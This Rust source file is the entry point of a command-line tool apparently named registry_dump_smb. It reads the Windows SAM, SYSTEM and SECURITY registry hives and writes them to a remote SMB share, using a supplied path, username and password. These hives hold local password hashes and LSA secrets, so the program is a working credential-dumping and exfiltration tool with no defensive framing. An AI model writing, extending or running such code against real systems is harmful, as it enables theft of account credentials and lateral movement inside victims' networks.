use registry_dump_smb::{
    error::ErrorCode,
    registry::RegistryHive,
    hive_builder::HiveBuilder,
    smb::SmtWriter,
};

struct CliArgs {
    smb_path: Option<String>,
    username: Option<String>,
    password: Option<String>,
}

fn parse_args() -> Result<CliArgs, i32> {
    let args: Vec<String> = std::env::args().collect();

    let mut cli_args = CliArgs {
        smb_path: None,
        username: None,
        password: None,
    };

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--path" => {
                if i + 1 < args.len() {
                    cli_args.smb_path = Some(args[i + 1].clone());
                    i += 2;
                } else {
                    return Err(ErrorCode::OtherError as i32);
                }
            }
            "--username" => {
                if i + 1 < args.len() {
                    cli_args.username = Some(args[i + 1].clone());
                    i += 2;
                } else {
                    return Err(ErrorCode::OtherError as i32);
                }
            }
            "--password" => {
                if i + 1 < args.len() {
                    cli_args.password = Some(args[i + 1].clone());
                    i += 2;
                } else {
                    return Err(ErrorCode::OtherError as i32);
                }
            }
            _ => {
                return Err(ErrorCode::OtherError as i32);
            }
        }
    }

    Ok(cli_args)
}

fn main() {
    let result = run();
    std::process::exit(result);
}

fn run() -> i32 {
    let cli_args = match parse_args() {
        Ok(args) => args,
        Err(code) => return code,
    };

    // If no SMB path provided, return success (no-op)
    let smb_path = match cli_args.smb_path {
        Some(path) => path,
        None => return ErrorCode::Success as i32,
    };

    // Connect to SMB
    let _smb = match SmtWriter::connect(
        &smb_path,
        cli_args.username.as_deref(),
        cli_args.password.as_deref(),
    ) {
        Ok(writer) => writer,
        Err(code) => return code,
    };

    // Read, build, and write each hive
    let hive_names = ["SAM", "SYSTEM", "SECURITY"];

    for hive_name in &hive_names {
        // Read hive from registry
        let hive = match RegistryHive::read(hive_name) {
            Ok(h) => h,
            Err(code) => return code,
        };

        // Build binary format
        let binary_data = match HiveBuilder::build(&hive) {
            Ok(data) => data,
            Err(code) => return code,
        };

        // Write to SMB
        let filename = format!("{}.bin", hive_name);
        if let Err(code) = _smb.write_file(&filename, &binary_data) {
            return code;
        }
    }

    ErrorCode::Success as i32
}
